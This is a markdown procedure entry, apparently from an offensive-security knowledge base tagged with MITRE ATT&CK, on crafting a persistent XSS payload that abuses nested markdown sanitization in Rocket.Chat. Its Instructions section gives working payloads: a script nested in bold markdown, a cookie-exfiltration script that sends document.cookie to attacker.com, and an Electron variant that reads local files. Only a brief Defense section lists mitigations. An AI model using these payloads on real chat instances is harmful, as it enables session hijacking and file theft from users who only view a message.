---
id: proc-craft-xss-payload
name: Craft-XSS-Payload-for-Nested-Markdown
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:37.369Z'
tactics:
  - '[[Execution]]'
techniques:
  - '[[JavaScript]]'
sub_techniques: []
tags:
  - xss
  - payload-crafting
commands: []
platforms:
  - Web
tools: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---

# Craft-XSS-Payload-for-Nested-Markdown

## Summary

This procedure crafts a JavaScript payload that exploits improper sanitization of nested markdown tags in Rocket.Chat, allowing injection of executable script into messages for persistent XSS.

## Description

In Rocket.Chat, markdown rendering fails to sanitize nested tags properly, enabling attackers to embed <script> tags within markdown like bold (**text**) or code blocks. The payload executes when any user views the message, affecting web and Electron clients. Prerequisites include understanding JS for browser/Electron contexts; outcomes include arbitrary code execution leading to data theft or escalation.

## Requirements

1. Access to a text editor or browser console for testing.
2. Knowledge of Rocket.Chat's markdown parser quirks.
3. Target: Rocket.Chat instance with vulnerable rendering (pre-patch versions).

## Defense

Defensive measures and detection strategies:

- Enable strict Content Security Policy (CSP) to block inline scripts.
- Sanitize all user inputs with libraries like DOMPurify, stripping script tags even in nested contexts.
- Monitor for unusual JS execution in chat logs or browser dev tools.

## Objectives

1. Create a bypass payload for markdown sanitization.
2. Validate payload renders executable JS.
3. Prepare for injection to achieve persistent storage.

## Instructions

### Step 1: Identify Nested Tag Bypass

**Context**: Test markdown combinations to find unsanitized nesting, such as script inside bold or italic tags.

No specific command; manually craft: `**<script>alert('XSS Test');</script>**`

> This payload uses bold markdown to nest the script tag, evading basic filters. Expected output: When rendered, 'XSS Test' alert triggers.

### Step 2: Enhance for Escalation

**Context**: Modify payload for real impact, like API calls or file access in Electron.

Craft advanced: `**<script>document.location='http://attacker.com/steal?cookie='+document.cookie;</script>**`

> This exfiltrates cookies upon execution. In Electron, use `**<script>const fs=require('fs');fs.readFile('/path/to/file','utf8',console.log);</script>**` for file reads.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[payload-crafting]]
